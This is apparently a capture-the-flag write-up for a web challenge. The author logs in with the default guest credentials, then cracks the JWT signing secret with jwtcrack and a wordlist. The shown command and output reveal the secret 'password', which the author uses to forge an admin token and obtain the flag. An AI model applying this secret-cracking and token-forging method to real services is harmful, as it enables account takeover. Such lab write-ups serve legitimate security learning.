# Challenge overview

Url: https://tastycookie.sumonnath.repl.co

There is a login page and i tried a lot all sql injections but not work. after while, i got idea to use common username and password list.

And by that for username and password `guest` is worked. When we logined, we can see the really wired jwt token.

orgrinal jwt token:
`eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJpZCI6Mn0.ag4rnpi-A1ENHyHJV0V9AZWeIfWxDo38ooJ3UQfU_co`

decoded:
```
Header:
{
  "alg": "HS256",
  "typ": "JWT"
}

Payload: (important part)
{
  "user": "guest",
  "id": 2
}
```
So , i changed the user to `admin` and `id` to `1` because admin is the first user of website as usually and i used the edited token, but it didn't worked. 

Edited jwt token's header

```
Header:
{
  "alg": "HS256",
  "typ": "JWT"
}

Payload: (important part)
{
  "user": "admin",
  "id": 1
}

```

After researching while, i knew that i need to `secret key` of token. So i used this python script tool to crack the `real key` [Jwtcrack](https://github.com/Sjord/jwtcrack)

`Command: sudo python3 crackjwt.py eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiZ3Vlc3QiLCJpZCI6Mn0.ag4rnpi-A1ENHyHJV0V9AZWeIfWxDo38ooJ3UQfU_co rockyou.txt`

Output:
`Found secret key: password`

So, we know secret key now. we just need to add the **secret key** (`password`) in https://jwt.io/ 's `VERIFY SIGNATURE` feature.

Final Jwt token's headers

```
Header:
{
  "alg": "HS256",
  "typ": "JWT"
}

Payload: (important part)
{
  "user": "admin",
  "id": 1
}

VERIFY SIGNATURE: 

HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  [password] (place to enter our secret key)
  secret base64 encoded
```

Final token: `eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4iLCJpZCI6MX0.MvHiKRJGPsr3tglm-khTh_lHWizATyxVoCs2lyVKiso`

and copy the final jwt token and paste in cookie manger for website and got flag. Really Really Cool!

# flag
DSPH{i_love_cookie_playing}
